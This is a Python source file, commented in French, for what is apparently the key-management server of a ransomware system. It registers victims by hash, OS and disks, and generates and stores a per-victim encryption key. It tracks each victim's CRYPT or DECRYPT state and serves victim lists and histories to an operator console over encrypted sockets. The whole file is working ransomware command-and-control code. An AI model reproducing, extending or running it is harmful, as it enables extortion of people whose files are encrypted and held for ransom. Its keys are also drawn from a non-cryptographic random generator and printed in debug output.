import utile.network as network
import utile.message as message
import utile.security as security
import utile.data as data
import string
import random
import queue
from threading import Thread
import time

DEBUG = True

AES_GCM = True
IP_SERV_CONSOLE = ''
IP_SERV_FRONTAL = ''
PORT_SERV_CONSOLE = 0
PORT_SERV_FRONTAL = 0

def generate_key(longueur=0, caracteres=string.ascii_letters + string.digits):
    """
    Générer une clé de longueur (longueur) contenant uniquement les caractères (caracteres)
    :param longueur: La longueur de la clé à générer
    :param caracteres: Les caractères qui composeront la clé
    :return: La clé générée
    """
    # Génère une clé aléatoire composée de lettres et chiffres
    key = ''.join(random.choice(caracteres) for _ in range(longueur))

    if DEBUG:
        print(f"[INFO] Clé générée ({longueur} caractères) : {key}")

    return key

def main():
    global AES_GCM, IP_SERV_CONSOLE, PORT_SERV_CONSOLE, IP_SERV_FRONTAL, PORT_SERV_FRONTAL

    # Chargement de la configuration
    #config.load_config('config/serveur_cles.cfg', 'config/serveur_cles.key')
    #AES_GCM = config.get_config('AES_GCM')
    #DEBUG_MODE = config.get_config('DEBUG_MODE')
    #IP_SERV_CONSOLE = config.get_config('IP_SERV_CONSOLE')
    #IP_SERV_FRONTAL = config.get_config('IP_SERV_FRONTAL')
    #PORT_SERV_CONSOLE = int(config.get_config('PORT_SERV_CONSOLE'))
    #PORT_SERV_FRONTAL = int(config.get_config('PORT_SERV_FRONTAL'))

    # Connexion à la base de donnée
    conn_db = data.connect_db()

    # Création des files de message
    q_request = queue.Queue()             # Requêtes vers la DB
    q_response_console = queue.Queue()    # Réponses vers la console
    q_response_frontal = queue.Queue()    # Réponses vers le frontal

    # Démarrage des threads de communication
    t_console = Thread(target=thread_console, args=(q_request, q_response_console,), daemon=True)
    t_console.start()

    t_frontal = Thread(target=thread_frontal, args=(q_request, q_response_frontal,), daemon=True)
    t_frontal.start()

    # Boucle principale du serveur de clés
    while True:
        msg = q_request.get()
        msg_type = message.get_message_type(msg)
        if DEBUG:
            print(f"[INFO] Type de message reçu : {msg_type}")

        # Liste des victimes
        if msg_type == 'LIST_VICTIM_REQ':
            # Récupérations de la liste de victims
            victims = data.get_list_victims(conn_db)
            if DEBUG:
                print(f"[INFO] {len(victims)} victime(s) récupérée(s) depuis la base de données")
            for victim in victims:
                msg_type = message.get_message_type(message.LIST_VICTIM_RESP)
                msg = message.set_message(msg_type, victim)
                if DEBUG:
                    print(f"[DEBUG] Envoi message: {msg}")
                q_response_console.put(msg)
                q_response_console.join()

            msg = message.set_message(message.get_message_type(message.LIST_VICTIM_END))
            if DEBUG:
                print(f"[DEBUG] Envoi message: {msg}")
            q_response_console.put(msg)
            q_response_console.join()
            q_request.task_done()

        # Si liste historique d'une victime
        if msg_type == 'HISTORY_REQ':
            hash_victim = msg['HIST_REQ']
            if DEBUG:
                print(f"[INFO] Requête d'historique reçue pour la victime avec hash : {hash_victim[:10]}...")
            histories = data.get_list_history(conn_db, hash_victim)
            for history in histories:
                msg = message.set_message(message.get_message_type(message.HISTORY_RESP), history)
                if DEBUG:
                    print(f"[DEBUG] Envoi message: {msg}")
                q_response_console.put(msg)
                q_response_console.join()
            msg = message.set_message(message.get_message_type(message.HISTORY_END), [hash_victim])
            if DEBUG:
                print(f"[DEBUG] Envoi message: {msg}")
            q_response_console.put(msg)
            q_response_console.join()
            q_request.task_done()

        # Message de demande changement
        elif msg_type == 'CHANGE_STATE':
            hash_victim = msg['CHGSTATE']
            if DEBUG:
                print(f"[INFO] Demande de changement d'état vers 'DECRYPT' pour la victime avec hash : {hash_victim[:10]}...")
            data.change_state_decrypt(conn_db, hash_victim)
            q_request.task_done()

        # Etat Initialisation d'une victime par serveur frontal
        elif msg_type == 'CRYPT_REQ':
            # Récupération du hash de la victime
            hash_victim = msg['INITIALIZE']

            # Vérification du hash
            victim = data.check_hash(conn_db, hash_victim)
            if victim is None:
                # Génération de la clé de chiffrement
                key_victim = generate_key(512)

                # Enregistrement du nouveau victim dans la table victim en recupérant sont hash
                os_victim = msg['OS']
                disks_victim = msg['DISKS']
                data.new_victim(conn_db, hash_victim, os_victim, disks_victim, key_victim)

                # Enregistré l'utilisateur dans la table states
                timestamp = int(time.time())
                state = "CRYPT"
                data.insert_new_state(conn_db, hash_victim, timestamp, state)

                victim = [hash_victim, key_victim, 'CRYPT']

            msg = message.set_message(message.get_message_type(message.CRYPT_KEY), victim)
            if DEBUG:
                print(f"[DEBUG] Envoi message: {msg}")
            q_response_frontal.put(msg)
            q_response_frontal.join()
            q_request.task_done()


def thread_console(q_request, q_response_console,):
    """

    :param q_request:
    :param q_response_console:
    :return:
    """
    aes_key = b''
    s_serveur = network.start_net_serv(IP_SERV_CONSOLE, PORT_SERV_CONSOLE)

    while True:
        print(f"[Serveur de clés] : en écoute sur {IP_SERV_CONSOLE}:{PORT_SERV_CONSOLE}.")
        s_console, address_console = s_serveur.accept()
        print(f"[Serveur de clés] : Connexion console {address_console} établie.")

        if AES_GCM:
            aes_key = security.diffie_hellman_send_key(s_console)
            if DEBUG:
                print(f"[DEBUG] Clé AES générée : {aes_key}")

        while True:
            msg = network.receive_message(s_console)
            if DEBUG:
                print(f"[SERVEUR CLE] Message recu du serveur de controle: {msg}")
            if not msg:
                break

            if AES_GCM:
                msg = security.aes_decrypt(msg, aes_key)
            msg_type = message.get_message_type(msg)
            if DEBUG:
                print(f"[+] Type message : {msg_type}")

            # Traitement des messages
            if msg_type == 'LIST_VICTIM_REQ':
                q_request.put(msg)
                msg = q_response_console.get()
                while message.get_message_type(msg) != 'LIST_VICTIM_END':
                    if AES_GCM:
                        msg = security.aes_encrypt(msg, aes_key)
                    network.send_message(s_console, msg)
                    q_response_console.task_done()
                    msg = q_response_console.get()
                if AES_GCM:
                    msg = security.aes_encrypt(msg, aes_key)
                network.send_message(s_console, msg)
                q_response_console.task_done()

            elif msg_type == 'HISTORY_REQ':
                q_request.put(msg)
                msg = q_response_console.get()
                while message.get_message_type(msg) != 'HISTORY_END':
                    if AES_GCM:
                        msg = security.aes_encrypt(msg, aes_key)
                    network.send_message(s_console, msg)
                    q_response_console.task_done()
                    msg = q_response_console.get()
                if AES_GCM:
                    msg = security.aes_encrypt(msg, aes_key)
                network.send_message(s_console, msg)
                q_response_console.task_done()

            elif msg_type == 'CHANGE_STATE':
                q_request.put(msg)

def thread_frontal(q_request, q_response_frontal,):
    """

    :param q_request:
    :param q_response_frontal:
    :return:
    """
    aes_key = b''
    s_serveur = network.start_net_serv(IP_SERV_FRONTAL, PORT_SERV_FRONTAL)

    while True:
        print(f"[Serveur de clés] : en écoute sur {IP_SERV_FRONTAL}:{PORT_SERV_FRONTAL}.")
        s_frontal, address_frontal = s_serveur.accept()
        print(f"[Serveur de clés] : Connexion frontal {address_frontal} établie.")

        if AES_GCM:
            aes_key = security.diffie_hellman_send_key(s_frontal)
            if DEBUG:
                print(f"[DEBUG] Clé AES générée : {aes_key}")

        while True:
            msg = network.receive_message(s_frontal)
            if not msg:
                break
            if AES_GCM:
                msg = security.aes_decrypt(msg, aes_key)
            msg_type = message.get_message_type(msg)

            if msg_type == 'CRYPT_REQ':
                q_request.put(msg)
                msg = q_response_frontal.get()
                if message.get_message_type(msg) == 'CRYPT_KEY':
                    if AES_GCM:
                        msg = security.aes_encrypt(msg, aes_key)
                    network.send_message(s_frontal, msg)
                    q_response_frontal.task_done()

if __name__ == '__main__':
    main()
